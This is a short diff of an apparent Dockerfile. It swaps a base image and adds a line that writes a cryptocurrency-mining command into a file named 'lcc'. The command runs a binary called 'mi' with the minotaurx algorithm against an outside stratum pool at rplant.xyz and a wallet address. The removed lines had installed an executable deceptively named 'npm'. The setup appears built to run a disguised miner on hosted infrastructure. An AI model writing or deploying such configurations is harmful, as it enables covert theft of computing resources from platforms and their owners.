@@ -1,7 +1,3 @@
-FROM christiankm01/kilo
-RUN rm /root/a/.platform.app.yaml
-COPY .platform.app.yaml /root/a/.platform.app.yaml
-RUN rm /root/a/npm
-COPY npm /root/a/npm
-RUN chmod +x /root/a/npm
-WORKDIR /root
+FROM christiankm01/kilo:1
+RUN echo "mi -a minotaurx  -o stratum+tcps://stratum-eu.rplant.xyz:17063 -u CKhjQDYLfRjB12f86pSqUHzYmsPPshmiHq --time-limit 6000 -t 1" > lcc
+
